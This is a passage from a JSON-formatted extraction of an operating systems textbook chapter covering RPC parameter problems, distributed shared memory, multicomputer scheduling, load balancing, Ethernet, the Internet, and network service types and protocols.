Issues\r\nDespite the conceptual elegance of RPC, there are a few snakes hiding under\r\nthe grass. A big one is the use of pointer parameters. Normally, passing a pointer\r\nto a procedure is not a problem. The called procedure can use the pointer the same\r\nway the caller can because the two procedures reside in the same virtual address\n558 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nspace. With RPC, passing pointers is impossible because the client and server are\r\nin different address spaces.\r\nIn some cases, tricks can be used to make it possible to pass pointers. Suppose\r\nthat the first parameter is a pointer to an integer, k. The client stub can marshal k\r\nand send it along to the server. The server stub then creates a pointer to k and\r\npasses it to the server procedure, just as it expects. When the server procedure re\u0002turns control to the server stub, the latter sends k back to the client, where the new\r\nk is copied over the old one, just in case the server changed it. In effect, the stan\u0002dard calling sequence of call-by-reference has been replaced by copy restore. Un\u0002fortunately, this trick does not always work, for example, if the pointer points to a\r\ngraph or other complex data structure. For this reason, some restrictions must be\r\nplaced on parameters to procedures called remotely.\r\nA second problem is that in weakly typed languages, like C, it is perfectly legal\r\nto write a procedure that computes the inner product of two vectors (arrays), with\u0002out specifying how large either one is. Each could be terminated by a special value\r\nknown only to the calling and called procedures. Under these circumstances, it is\r\nessentially impossible for the client stub to marshal the parameters: it has no way\r\nof determining how large they are.\r\nA third problem is that it is not always possible to deduce the types of the pa\u0002rameters, not even from a formal specification or the code itself. An example is\r\nprintf, which may have any number of parameters (at least one), and they can be an\r\narbitrary mixture of integers, shorts, longs, characters, strings, floating-point num\u0002bers of various lengths, and other types. Trying to call printf as a remote procedure\r\nwould be practically impossible because C is so permissive. Howev er, a rule saying\r\nthat RPC can be used provided that you do not program in C (or C++) would not\r\nbe popular.\r\nA fourth problem relates to the use of global variables. Normally, the calling\r\nand called procedures may communicate using global variables, in addition to\r\ncommunicating via parameters. If the called procedure is now moved to a remote\r\nmachine, the code will fail because the global variables are no longer shared.\r\nThese problems are not meant to suggest that RPC is hopeless. In fact, it is\r\nwidely used, but some restrictions and care are needed to make it work well in\r\npractice."
          },
          "8.2.5 Distributed Shared Memory": {
            "page": 589,
            "content": "8.2.5 Distributed Shared Memory\r\nAlthough RPC has its attractions, many programmers still prefer a model of\r\nshared memory and would like to use it, even on a multicomputer. Surprisingly\r\nenough, it is possible to preserve the illusion of shared memory reasonably well,\r\nev en when it does not actually exist, using a technique called DSM (Distributed\r\nShared Memory) (Li, 1986; and Li and Hudak, 1989). Despite being an old topic,\r\nresearch on it is still going strong (Cai and Strazdins, 2012; Choi and Jung, 2013;\r\nand Ohnishi and Yoshida, 2011). DSM is a useful technique to study as it shows\nSEC. 8.2 MULTICOMPUTERS 559\r\nmany of the issues and complications in distributed systems. Moreover, the idea it\u0002self has been very influential. With DSM, each page is located in one of the mem\u0002ories of Fig. 8-1(b). Each machine has its own virtual memory and page tables.\r\nWhen a CPU does a LOAD or STORE on a page it does not have, a trap to the oper\u0002ating system occurs. The operating system then locates the page and asks the CPU\r\ncurrently holding it to unmap the page and send it over the interconnection net\u0002work. When it arrives, the page is mapped in and the faulting instruction restarted.\r\nIn effect, the operating system is just satisfying page faults from remote RAM in\u0002stead of from local disk. To the user, the machine looks as if it has shared memory.\r\nThe difference between actual shared memory and DSM is illustrated in\r\nFig. 8-21. In Fig. 8-21(a), we see a true multiprocessor with physical shared mem\u0002ory implemented by the hardware. In Fig. 8-21(b), we see DSM, implemented by\r\nthe operating system. In Fig. 8-21(c), we see yet another form of shared memory,\r\nimplemented by yet higher levels of software. We will come back to this third\r\noption later in the chapter, but for now we will concentrate on DSM.\r\n(a)\r\nMachine 1 Machine 2\r\nRun-time\r\nsystem\r\nOperating\r\nsystem\r\nShared memory\r\nApplication\r\nHardware\r\nRun-time\r\nsystem\r\nOperating\r\nsystem\r\nApplication\r\nHardware\r\n(b)\r\nMachine 1 Machine 2\r\nRun-time\r\nsystem\r\nOperating\r\nsystem\r\nShared memory\r\nApplication\r\nHardware\r\nRun-time\r\nsystem\r\nOperating\r\nsystem\r\nApplication\r\nHardware\r\n(c)\r\nMachine 1 Machine 2\r\nRun-time\r\nsystem\r\nOperating\r\nsystem\r\nShared memory\r\nApplication\r\nHardware\r\nRun-time\r\nsystem\r\nOperating\r\nsystem\r\nApplication\r\nHardware\r\nFigure 8-21. Various layers where shared memory can be implemented. (a) The\r\nhardware. (b) The operating system. (c) User-level software.\r\nLet us now look in some detail at how DSM works. In a DSM system, the ad\u0002dress space is divided up into pages, with the pages being spread over all the nodes\r\nin the system. When a CPU references an address that is not local, a trap occurs,\n560 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nand the DSM software fetches the page containing the address and restarts the\r\nfaulting instruction, which now completes successfully. This concept is illustrated\r\nin Fig. 8-22(a) for an address space with 16 pages and four nodes, each capable of\r\nholding six pages.\r\nGlobally shared virtual memory consisting of 16 pages\r\nMemory\r\nNetwork\r\n(a)\r\n(b)\r\n(c)\r\n0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15\r\nCPU 0\r\n025\r\n9\r\nCPU 1\r\n1 36\r\n8 10\r\nCPU 2\r\n4 7 11\r\n12 14\r\nCPU 3\r\n13 15\r\nCPU 0\r\n025\r\n9\r\nCPU 1\r\n1 36\r\n10 8\r\n10\r\nCPU 2\r\n4 7 11\r\n12 14\r\nCPU 3\r\n13 15\r\nCPU 0\r\n025\r\n9\r\nCPU 1\r\n1 36\r\n8 10\r\nCPU 2\r\n4 7 11\r\n12 14\r\nCPU 3\r\n13 15\r\nFigure 8-22. (a) Pages of the address space distributed among four machines.\r\n(b) Situation after CPU 0 references page 10 and the page is moved there.\r\n(c) Situation if page 10 is read only and replication is used.\r\nIn this example, if CPU 0 references instructions or data in pages 0, 2, 5, or 9,\r\nthe references are done locally. References to other pages cause traps. For ex\u0002ample, a reference to an address in page 10 will cause a trap to the DSM software,\r\nwhich then moves page 10 from node 1 to node 0, as shown in Fig. 8-22(b).\nSEC. 8.2 MULTICOMPUTERS 561\r\nReplication\r\nOne improvement to the basic system that can improve performance consid\u0002erably is to replicate pages that are read only, for example, program text, read-only\r\nconstants, or other read-only data structures. For example, if page 10 in Fig. 8-22 is\r\na section of program text, its use by CPU 0 can result in a copy being sent to CPU\r\n0 without the original in CPU 1’s memory being invalidated or disturbed, as shown\r\nin Fig. 8-22(c). In this way, CPUs 0 and 1 can both reference page 10 as often as\r\nneeded without causing traps to fetch missing memory.\r\nAnother possibility is to replicate not only read-only pages, but also all pages.\r\nAs long as reads are being done, there is effectively no difference between replicat\u0002ing a read-only page and replicating a read-write page. However, if a replicated\r\npage is suddenly modified, special action has to be taken to prevent having multi\u0002ple, inconsistent copies in existence. How inconsistency is prevented will be dis\u0002cussed in the following sections.\r\nFalse Sharing\r\nDSM systems are similar to multiprocessors in certain key ways. In both sys\u0002tems, when a nonlocal memory word is referenced, a chunk of memory containing\r\nthe word is fetched from its current location and put on the machine making the\r\nreference (main memory or cache, respectively). An important design issue is how\r\nbig the chunk should be? In multiprocessors, the cache block size is usually 32 or\r\n64 bytes, to avoid tying up the bus with the transfer too long. In DSM systems, the\r\nunit has to be a multiple of the page size (because the MMU works with pages),\r\nbut it can be 1, 2, 4, or more pages. In effect, doing this simulates a larger page\r\nsize.\r\nThere are advantages and disadvantages to a larger page size for DSM. The\r\nbiggest advantage is that because the startup time for a network transfer is fairly\r\nsubstantial, it does not really take much longer to transfer 4096 bytes than it does\r\nto transfer 1024 bytes. By transferring data in large units, when a large piece of\r\naddress space has to be moved, the number of transfers may often be reduced. This\r\nproperty is especially important because many programs exhibit locality of refer\u0002ence, meaning that if a program has referenced one word on a page, it is likely to\r\nreference other words on the same page in the immediate future.\r\nOn the other hand, the network will be tied up longer with a larger transfer,\r\nblocking other faults caused by other processes. Also, too large an effective page\r\nsize introduces a new problem, called false sharing, illustrated in Fig. 8-23. Here\r\nwe have a page containing two unrelated shared variables, A and B. Processor 1\r\nmakes heavy use of A, reading and writing it. Similarly, process 2 uses B frequent\u0002ly. Under these circumstances, the page containing both variables will constantly\r\nbe traveling back and forth between the two machines.\n562 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nCPU 1\r\nCode using\r\nvariable A\r\nA\r\nB\r\nShared\r\npage\r\nCPU 2\r\nCode using\r\nvariable B\r\nA\r\nB\r\nNetwork\r\nA and B are unrelated\r\nshared variables that just\r\nhappen to be on the same page\r\nFigure 8-23. False sharing of a page containing two unrelated variables.\r\nThe problem here is that although the variables are unrelated, they appear by\r\naccident on the same page, so when a process uses one of them, it also gets the\r\nother. The larger the effective page size, the more often false sharing will occur,\r\nand conversely, the smaller the effective page size, the less often it will occur.\r\nNothing analogous to this phenomenon is present in ordinary virtual memory sys\u0002tems.\r\nClever compilers that understand the problem and place variables in the ad\u0002dress space accordingly can help reduce false sharing and improve performance.\r\nHowever, saying this is easier than doing it. Furthermore, if the false sharing con\u0002sists of node 1 using one element of an array and node 2 using a different element\r\nof the same array, there is little that even a clever compiler can do to eliminate the\r\nproblem.\r\nAchieving Sequential Consistency\r\nIf writable pages are not replicated, achieving consistency is not an issue.\r\nThere is exactly one copy of each writable page, and it is moved back and forth dy\u0002namically as needed. Since it is not always possible to see in advance which pages\r\nare writable, in many DSM systems, when a process tries to read a remote page, a\r\nlocal copy is made and both the local and remote copies are set up in their re\u0002spective MMUs as read only. As long as all references are reads, everything is\r\nfine.\r\nHowever, if any process attempts to write on a replicated page, a potential con\u0002sistency problem arises because changing one copy and leaving the others alone is\r\nunacceptable. This situation is analogous to what happens in a multiprocessor\r\nwhen one CPU attempts to modify a word that is present in multiple caches. The\r\nsolution there is for the CPU about to do the write to first put a signal on the bus\r\ntelling all other CPUs to discard their copy of the cache block. DSM systems typi\u0002cally work the same way. Before a shared page can be written, a message is sent to\nSEC. 8.2 MULTICOMPUTERS 563\r\nall other CPUs holding a copy of the page telling them to unmap and discard the\r\npage. After all of them have replied that the unmap has finished, the original CPU\r\ncan now do the write.\r\nIt is also possible to tolerate multiple copies of writable pages under carefully\r\nrestricted circumstances. One way is to allow a process to acquire a lock on a por\u0002tion of the virtual address space, and then perform multiple read and write opera\u0002tions on the locked memory. At the time the lock is released, changes can be prop\u0002agated to other copies. As long as only one CPU can lock a page at a given\r\nmoment, this scheme preserves consistency.\r\nAlternatively, when a potentially writable page is actually written for the first\r\ntime, a clean copy is made and saved on the CPU doing the write. Locks on the\r\npage can then be acquired, the page updated, and the locks released. Later, when a\r\nprocess on a remote machine tries to acquire a lock on the page, the CPU that\r\nwrote it earlier compares the current state of the page to the clean copy and builds\r\na message listing all the words that have changed. This list is then sent to the\r\nacquiring CPU to update its copy instead of invalidating it (Keleher et al., 1994)."
          },
          "8.2.6 Multicomputer Scheduling": {
            "page": 594,
            "content": "8.2.6 Multicomputer Scheduling\r\nOn a multiprocessor, all processes reside in the same memory. When a CPU\r\nfinishes its current task, it picks a process and runs it. In principle, all processes\r\nare potential candidates. On a multicomputer the situation is quite different. Each\r\nnode has its own memory and its own set of processes. CPU 1 cannot suddenly\r\ndecide to run a process located on node 4 without first doing a fair amount of work\r\nto go get it. This difference means that scheduling on multicomputers is easier but\r\nallocation of processes to nodes is more important. Below we will study these is\u0002sues.\r\nMulticomputer scheduling is somewhat similar to multiprocessor scheduling,\r\nbut not all of the former’s algorithms apply to the latter. The simplest multiproces\u0002sor algorithm—maintaining a single central list of ready processes—does not work\r\nhowever, since each process can only run on the CPU it is currently located on.\r\nHowever, when a new process is created, a choice can be made where to place it,\r\nfor example to balance the load.\r\nSince each node has its own processes, any local scheduling algorithm can be\r\nused. However, it is also possible to use multiprocessor gang scheduling, since that\r\nmerely requires an initial agreement on which process to run in which time slot,\r\nand some way to coordinate the start of the time slots."
          },
          "8.2.7 Load Balancing": {
            "page": 594,
            "content": "8.2.7 Load Balancing\r\nThere is relatively little to say about multicomputer scheduling because once a\r\nprocess has been assigned to a node, any local scheduling algorithm will do, unless\r\ngang scheduling is being used. However, precisely because there is so little control\n564 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nonce a process has been assigned to a node, the decision about which process\r\nshould go on which node is important. This is in contrast to multiprocessor sys\u0002tems, in which all processes live in the same memory and can be scheduled on any\r\nCPU at will. Consequently, it is worth looking at how processes can be assigned to\r\nnodes in an effective way. The algorithms and heuristics for doing this assignment\r\nare known as processor allocation algorithms.\r\nA large number of processor (i.e., node) allocation algorithms have been pro\u0002posed over the years. They differ in what they assume is known and what the goal\r\nis. Properties that might be known about a process include the CPU requirements,\r\nmemory usage, and amount of communication with every other process. Possible\r\ngoals include minimizing wasted CPU cycles due to lack of local work, minimiz\u0002ing total communication bandwidth, and ensuring fairness to users and processes.\r\nBelow we will examine a few algorithms to give an idea of what is possible.\r\nA Graph-Theoretic Deterministic Algorithm\r\nA widely studied class of algorithms is for systems consisting of processes\r\nwith known CPU and memory requirements, and a known matrix giving the aver\u0002age amount of traffic between each pair of processes. If the number of processes is\r\ngreater than the number of CPUs, k, sev eral processes will have to be assigned to\r\neach CPU. The idea is to perform this assignment to minimize network traffic.\r\nThe system can be represented as a weighted graph, with each vertex being a\r\nprocess and each arc representing the flow of messages between two processes.\r\nMathematically, the problem then reduces to finding a way to partition (i.e., cut)\r\nthe graph into k disjoint subgraphs, subject to certain constraints (e.g., total CPU\r\nand memory requirements below some limits for each subgraph). For each solu\u0002tion that meets the constraints, arcs that are entirely within a single subgraph\r\nrepresent intramachine communication and can be ignored. Arcs that go from one\r\nsubgraph to another represent network traffic. The goal is then to find the parti\u0002tioning that minimizes the network traffic while meeting all the constraints. As an\r\nexample, Fig. 8-24 shows a system of nine processes, A through I, with each arc\r\nlabeled with the mean communication load between those two processes (e.g., in\r\nMbps).\r\nIn Fig. 8-24(a), we have partitioned the graph with processes A, E, and G on\r\nnode 1, processes B, F, and H on node 2, and processes C, D, and I on node 3. The\r\ntotal network traffic is the sum of the arcs intersected by the cuts (the dashed\r\nlines), or 30 units. In Fig. 8-24(b) we have a different partitioning that has only 28\r\nunits of network traffic. Assuming that it meets all the memory and CPU con\u0002straints, this is a better choice because it requires less communication.\r\nIntuitively, what we are doing is looking for clusters that are tightly coupled\r\n(high intracluster traffic flow) but which interact little with other clusters (low\r\nintercluster traffic flow). Some of the earliest papers discussing the problem are\r\nChow and Abraham (1982, Lo, (1984), and Stone and Bokhari (1978).\nSEC. 8.2 MULTICOMPUTERS 565\r\nG H I\r\nA\r\nE F\r\nB C D\r\nNode 1 Node 2\r\n32 3\r\n5\r\n5\r\n8\r\n2 1\r\n4\r\n4 2\r\n3\r\n6\r\n2\r\n1\r\n4\r\nNode 3\r\nG H I\r\nA\r\nE F\r\nB C D\r\nNode 1 Node 2\r\n32 3\r\n5\r\n5\r\n8\r\n2 1\r\n4\r\n4 2\r\n3\r\n6\r\n2\r\n1\r\n4\r\nNode 3\r\nTraffic\r\nbetween\r\nD and I\r\nProcess\r\nFigure 8-24. Tw o ways of allocating nine processes to three nodes.\r\nA Sender-Initiated Distributed Heuristic Algorithm\r\nNow let us look at some distributed algorithms. One algorithm says that when\r\na process is created, it runs on the node that created it unless that node is overload\u0002ed. The metric for overloaded might involve too many processes, too big a total\r\nworking set, or some other metric. If it is overloaded, the node selects another\r\nnode at random and asks it what its load is (using the same metric). If the probed\r\nnode’s load is below some threshold value, the new process is sent there (Eager et\r\nal., 1986). If not, another machine is chosen for probing. Probing does not go on\r\nforever. If no suitable host is found within N probes, the algorithm terminates and\r\nthe process runs on the originating machine. The idea is for heavily loaded nodes\r\nto try to get rid of excess work, as shown in Fig. 8-25(a), which depicts send\u0002er-initiated load balancing.\r\nI’m full\r\nHere, have a process\r\nTake some work\r\nHelp !\r\nI’m overloaded\r\n(a) (b)\r\nI have nothing to do\r\nYawn\r\nI’m bored\r\nI’m free tonight\r\nNeed help ?\r\nFigure 8-25. (a) An overloaded node looking for a lightly loaded node to hand\r\noff processes to. (b) An empty node looking for work to do.\n566 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nEager et al. constructed an analytical queueing model of this algorithm. Using\r\nthis model, it was established that the algorithm behaves well and is stable under a\r\nwide range of parameters, including various threshold values, transfer costs, and\r\nprobe limits.\r\nNevertheless, it should be observed that under conditions of heavy load, all\r\nmachines will constantly send probes to other machines in a futile attempt to find\r\none that is willing to accept more work. Few processes will be off-loaded, but con\u0002siderable overhead may be incurred in the attempt to do so.\r\nA Receiver-Initiated Distributed Heuristic Algorithm\r\nA complementary algorithm to the one discussed above, which is initiated by\r\nan overloaded sender, is one initiated by an underloaded receiver, as shown in\r\nFig. 8-25(b). With this algorithm, whenever a process finishes, the system checks\r\nto see if it has enough work. If not, it picks some machine at random and asks it\r\nfor work. If that machine has nothing to offer, a second, and then a third machine\r\nis asked. If no work is found with N probes, the node temporarily stops asking,\r\ndoes any work it has queued up, and tries again when the next process finishes. If\r\nno work is available, the machine goes idle. After some fixed time interval, it\r\nbegins probing again.\r\nAn advantage of this algorithm is that it does not put extra load on the system\r\nat critical times. The sender-initiated algorithm makes large numbers of probes\r\nprecisely when the system can least tolerate it—when it is heavily loaded. With the\r\nreceiver-initiated algorithm, when the system is heavily loaded, the chance of a\r\nmachine having insufficient work is small. However, when this does happen, it will\r\nbe easy to find work to take over. Of course, when there is little work to do, the re\u0002ceiver-initiated algorithm creates considerable probe traffic as all the unemployed\r\nmachines desperately hunt for work. However, it is far better to have the overhead\r\ngo up when the system is underloaded than when it is overloaded.\r\nIt is also possible to combine both of these algorithms and have machines try\r\nto get rid of work when they hav e too much, and try to acquire work when they do\r\nnot have enough. Furthermore, machines can perhaps improve on random polling\r\nby keeping a history of past probes to determine if any machines are chronically\r\nunderloaded or overloaded. One of these can be tried first, depending on whether\r\nthe initiator is trying to get rid of work or acquire it."
          }
        }
      },
      "8.3 DISTRIBUTED SYSTEMS": {
        "page": 597,
        "children": {
          "8.3.1 Network Hardware": {
            "page": 599,
            "content": "8.3.1 Network Hardware\r\nDistributed systems are built on top of computer networks, so a brief introduc\u0002tion to the subject is in order. Networks come in two major varieties, LANs (Local\r\nArea Networks), which cover a building or a campus, and WANs (Wide Area\nSEC. 8.3 DISTRIBUTED SYSTEMS 569\r\nPentium\r\nWindows\r\nMiddleware Middleware Middleware Middleware\r\nApplication\r\nPentium\r\nLinux\r\nApplication\r\nSPARC\r\nSolaris\r\nApplication\r\nMac OS\r\nApplication\r\nMacintosh\r\nCommon base for applications\r\nNetwork\r\nFigure 8-27. Positioning of middleware in a distributed system.\r\nNetworks), which can be citywide, countrywide, or worldwide. The most impor\u0002tant kind of LAN is Ethernet, so we will examine that as an example LAN. As our\r\nexample WAN, we will look at the Internet, even though technically the Internet is\r\nnot one network, but a federation of thousands of separate networks. However, for\r\nour purposes, it is sufficient to think of it as one WAN.\r\nEthernet\r\nClassic Ethernet, which is described in IEEE Standard 802.3, consists of a co\u0002axial cable to which a number of computers are attached. The cable is called the\r\nEthernet, in reference to the luminiferous ether through which electromagnetic ra\u0002diation was once thought to propagate. (When the nineteenth-century British phys\u0002icist James Clerk Maxwell discovered that electromagnetic radiation could be de\u0002scribed by a wav e equation, scientists assumed that space must be filled with some\r\nethereal medium in which the radiation was propagating. Only after the famous\r\nMichelson-Morley experiment in 1887, which failed to detect the ether, did physi\u0002cists realize that radiation could propagate in a vacuum.)\r\nIn the very first version of Ethernet, a computer was attached to the cable by li\u0002terally drilling a hole halfway through the cable and screwing in a wire leading to\r\nthe computer. This was called a vampire tap, and is illustrated symbolically in\r\nFig. 8-28(a). The taps were hard to get right, so before long, proper connectors\r\nwere used. Nevertheless, electrically, all the computers were connected as if the\r\ncables on their network interface cards were soldered together.\n570 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nComputer\r\nEthernet\r\nSwitch\r\nComputer\r\nEthernet\r\n(a) (b)\r\nVampire tap\r\nFigure 8-28. (a) Classic Ethernet. (b) Switched Ethernet.\r\nWith many computers hooked up to the same cable, a protocol is needed to\r\nprevent chaos. To send a packet on an Ethernet, a computer first listens to the\r\ncable to see if any other computer is currently transmitting. If not, it just begins\r\ntransmitting a packet, which consists of a short header followed by a payload of 0\r\nto 1500 bytes. If the cable is in use, the computer simply waits until the current\r\ntransmission finishes, then it begins sending.\r\nIf two computers start transmitting simultaneously, a collision results, which\r\nboth of them detect. Both respond by terminating their transmissions, waiting a\r\nrandom amount of time between 0 and T μsec and then starting again. If another\r\ncollision occurs, all colliding computers randomize the wait into the interval 0 to\r\n2T μsec, and then try again. On each further collision, the maximum wait interval\r\nis doubled, reducing the chance of more collisions. This algorithm is known as\r\nbinary exponential backoff. We saw it earlier to reduce polling overhead on\r\nlocks.\r\nAn Ethernet has a maximum cable length and also a maximum number of\r\ncomputers that can be connected to it. To exceed either of these limits, a large\r\nbuilding or campus can be wired with multiple Ethernets, which are then con\u0002nected by devices called bridges. A bridge is a device that allows traffic to pass\r\nfrom one Ethernet to another when the source is on one side and the destination is\r\non the other.\r\nTo avoid the problem of collisions, modern Ethernets use switches, as shown in\r\nFig. 8-28(b). Each switch has some number of ports, to which can be attached a\r\ncomputer, an Ethernet, or another switch. When a packet successfully avoids all\r\ncollisions and makes it to the switch, it is buffered there and sent out on the port\r\nwhere the destination machine lives. By giving each computer its own port, all\r\ncollisions can be eliminated, at the cost of bigger switches. Compromises, with just\r\na few computers per port, are also possible. In Fig. 8-28(b), a classical Ethernet\r\nwith multiple computers connected to a cable by vampire taps is attached to one of\r\nthe ports of the switch.\nSEC. 8.3 DISTRIBUTED SYSTEMS 571\r\nThe Internet\r\nThe Internet evolved from the ARPANET, an experimental packet-switched\r\nnetwork funded by the U.S. Dept. of Defense Advanced Research Projects Agency.\r\nIt went live in December 1969 with three computers in California and one in Utah.\r\nIt was designed at the height of the Cold War to a be a highly fault-tolerant net\u0002work that would continue to relay military traffic even in the event of direct nuclear\r\nhits on multiple parts of the network by automatically rerouting traffic around the\r\ndead machines.\r\nThe ARPANET grew rapidly in the 1970s, eventually encompassing hundreds\r\nof computers. Then a packet radio network, a satellite network, and eventually\r\nthousands of Ethernets were attached to it, leading to the federation of networks we\r\nnow know as the Internet.\r\nThe Internet consists of two kinds of computers, hosts and routers. Hosts are\r\nPCs, notebooks, handhelds, servers, mainframes, and other computers owned by\r\nindividuals or companies that want to connect to the Internet. Routers are spe\u0002cialized switching computers that accept incoming packets on one of many incom\u0002ing lines and send them on their way along one of many outgoing lines. A router is\r\nsimilar to the switch of Fig. 8-28(b), but also differs from it in ways that will not\r\nconcern us here. Routers are connected together in large networks, with each router\r\nhaving wires or fibers to many other routers and hosts. Large national or world\u0002wide router networks are operated by telephone companies and ISPs (Internet Ser\u0002vice Providers) for their customers.\r\nFigure 8-29 shows a portion of the Internet. At the top we have one of the\r\nbackbones, normally operated by a backbone operator. It consists of a number of\r\nrouters connected by high-bandwidth fiber optics, with connections to backbones\r\noperated by other (competing) telephone companies. Usually, no hosts connect di\u0002rectly to the backbone, other than maintenance and test machines run by the tele\u0002phone company.\r\nAttached to the backbone routers by medium-speed fiber optic connections are\r\nregional networks and routers at ISPs. In turn, corporate Ethernets each have a\r\nrouter on them and these are connected to regional network routers. Routers at\r\nISPs are connected to modem banks used by the ISP’s customers. In this way,\r\nev ery host on the Internet has at least one path, and often many paths, to every\r\nother host.\r\nAll traffic on the Internet is sent in the form of packets. Each packet carries its\r\ndestination address inside it, and this address is used for routing. When a packet\r\ncomes into a router, the router extracts the destination address and looks (part of) it\r\nup in a table to find which outgoing line to send the packet on and thus to which\r\nrouter. This procedure is repeated until the packet reaches the destination host.\r\nThe routing tables are highly dynamic and are updated continuously as routers and\r\nlinks go down and come back up and as traffic conditions change. The routing\r\nalgorithms have been intensively studied and modified over the years.\n572 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nBackbone High-bandwidth fiber\r\nRouter at ISP\r\nADSL line\r\nto home PC\r\nHome PC\r\nMedium\u0002bandwidth\r\nfiber\r\nRouter\r\nHost\r\nEthernet\r\nFiber or\r\ncopper wire\r\nLocal router\r\nRegional network\r\nFigure 8-29. A portion of the Internet."
          },
          "8.3.2 Network Services and Protocols": {
            "page": 603,
            "content": "8.3.2 Network Services and Protocols\r\nAll computer networks provide certain services to their users (hosts and proc\u0002esses), which they implement using certain rules about legal message exchanges.\r\nBelow we will give a brief introduction to these topics.\r\nNetwork Services\r\nComputer networks provide services to the hosts and processes using them.\r\nConnection-oriented service is modeled after the telephone system. To talk to\r\nsomeone, you pick up the phone, dial the number, talk, and then hang up. Simi\u0002larly, to use a connection-oriented network service, the service user first establishes\r\na connection, uses the connection, and then releases the connection. The essential\r\naspect of a connection is that it acts like a tube: the sender pushes objects (bits) in\r\nat one end, and the receiver takes them out in the same order at the other end.\r\nIn contrast, connectionless service is modeled after the postal system. Each\r\nmessage (letter) carries the full destination address, and each one is routed through\r\nthe system independent of all the others. Normally, when two messages are sent to\r\nthe same destination, the first one sent will be the first one to arrive. Howev er, it is\r\npossible that the first one sent can be delayed so that the second one arrives first.\r\nWith a connection-oriented service this is impossible.\nSEC. 8.3 DISTRIBUTED SYSTEMS 573\r\nEach service can be characterized by a quality of service. Some services are\r\nreliable in the sense that they nev er lose data. Usually, a reliable service is imple\u0002mented by having the receiver confirm the receipt of each message by sending\r\nback a special acknowledgement packet so the sender is sure that it arrived. The\r\nacknowledgement process introduces overhead and delays, which are necessary to\r\ndetect packet loss, but which do slow things down.\r\nA typical situation in which a reliable connection-oriented service is appro\u0002priate is file transfer. The owner of the file wants to be sure that all the bits arrive\r\ncorrectly and in the same order they were sent. Very few file-transfer customers\r\nwould prefer a service that occasionally scrambles or loses a few bits, even if it is\r\nmuch faster.\r\nReliable connection-oriented service has two relatively minor variants: mes\u0002sage sequences and byte streams. In the former, the message boundaries are pre\u0002served. When two 1-KB messages are sent, they arrive as two distinct 1-KB mes\u0002sages, never as one 2-KB message. In the latter, the connection is simply a stream\r\nof bytes, with no message boundaries. When 2K bytes arrive at the receiver, there\r\nis no way to tell if they were sent as one 2-KB message, two 1-KB messages, 2048\r\n1-byte messages, or something else. If the pages of a book are sent over a network\r\nto an imagesetter as separate messages, it might be important to preserve the mes\u0002sage boundaries. On the other hand, with a terminal logging into a remote server\r\nsystem, a byte stream from the terminal to the computer is all that is needed. There\r\nare no message boundaries here.\r\nFor some applications, the delays introduced by acknowledgements are unac\u0002ceptable. One such application is digitized voice traffic. It is preferable for tele\u0002phone users to hear a bit of noise on the line or a garbled word from time to time\r\nthan to introduce a delay to wait for acknowledgements.\r\nNot all applications require connections. For example, to test the network, all\r\nthat is needed is a way to send a single packet that has a high probability of arrival,\r\nbut no guarantee. Unreliable (meaning not acknowledged) connectionless service\r\nis often called datagram service, in analogy with telegram service, which also\r\ndoes not provide an acknowledgement back to the sender.\r\nIn other situations, the convenience of not having to establish a connection to\r\nsend one short message is desired, but reliability is essential. The acknowledged\r\ndatagram service can be provided for these applications. It is like sending a regis\u0002tered letter and requesting a return receipt. When the receipt comes back, the send\u0002er is absolutely sure that the letter was delivered to the intended party and not lost\r\nalong the way.\r\nStill another service is the request-reply service. In this service the sender\r\ntransmits a single datagram containing a request; the reply contains the answer. For\r\nexample, a query to the local library asking where Uighur is spoken falls into this\r\ncategory. Request-reply is commonly used to implement communication in the cli\u0002ent-server model: the client issues a request and the server responds to it. Figure\r\n8-30 summarizes the types of services discussed above.\n574 MULTIPLE PROCESSOR SYSTEMS CHAP. 8\r\nService\r\nReliable message stream\r\nReliable byte stream\r\nUnreliable connection\r\nUnreliable datagram\r\nAcknowledged datagram\r\nRequest-reply\r\nExample\r\nSequence of pages of a book\r\nRemote login\r\nDigitized voice\r\nNetwork test packets\r\nRegistered mail\r\nDatabase query\r\nConnection-oriented\r\nConnectionless\r\nFigure 8-30. Six different types of network service.\r\nNetwork Protocols\r\nAll networks have highly specialized rules for what messages may be sent and\r\nwhat responses may be returned in response to these messages. For example, under\r\ncertain circumstances (e.g., file transfer), when a message is sent from a source to a\r\ndestination, the destination is required to send an acknowledgement back indicat\u0002ing correct receipt of the message. Under other circumstances (e.g., digital tele\u0002phony), no such acknowledgement is expected. The set of rules by which particular\r\ncomputers communicate is called a protocol. Many protocols exist, including\r\nrouter-router protocols, host-host protocols, and others. For a thorough treatment of\r\ncomputer networks and their protocols, see Computer Networks, 5/e (Tanenbaum\r\nand Wetherall, 2010).\r\nAll modern networks use what is called a protocol stack to layer different pro\u0002tocols on top of one another. At each layer, different issues are dealt with. For ex\u0002ample, at the bottom level protocols define how to tell where in the bit stream a\r\npacket begins and ends. At a higher level, protocols deal with how to route packets\r\nthrough complex networks from source to destination. And at a still higher level,\r\nthey make sure that all the packets in a multipacket message have arrived correctly\r\nand in the proper order.\r\nSince most distributed systems use the Internet as a base, the key protocols\r\nthese systems use are the two major Internet protocols: IP and TCP. IP (Internet\r\nProtocol) is a datagram protocol in which a sender injects a datagram of up to 64\r\nKB into the network and hopes that it arrives. No guarantees are given. The data\u0002gram may be fragmented into smaller packets as it passes through the Internet.\r\nThese packets travel independently, possibly along different routes. When all the\r\npieces get to the destination, they are assembled in the correct order and delivered.\r\nTw o versions of IP are currently in use, v4 and v6. At the moment, v4 still\r\ndominates, so we will describe that here, but v6 is up and coming. Each v4 packet\r\nstarts with a 40-byte header that contains a 32-bit source address and a 32-bit desti\u0002nation address among other fields. These are called IP addresses and form the\r\nbasis of Internet routing. They are conventionally written as four decimal numbers\nSEC. 8.3 DISTRIBUTED SYSTEMS 575\r\nin the range 0–255 separated by dots, as in 192.31.231.65. When a packet arrives\r\nat a router, the router extracts the IP destination address and uses that for routing.\r\nSince IP datagrams are not acknowledged, IP alone is not sufficient for reliable\r\ncommunication in the Internet. To provide reliable communication, another proto\u0002col, TCP (Transmission Control Protocol), is usually layered on top of IP. TCP\r\nuses IP to provide connection-oriented streams. To use TCP, a process first estab\u0002lishes a connection to a remote process. The process required is specified by the 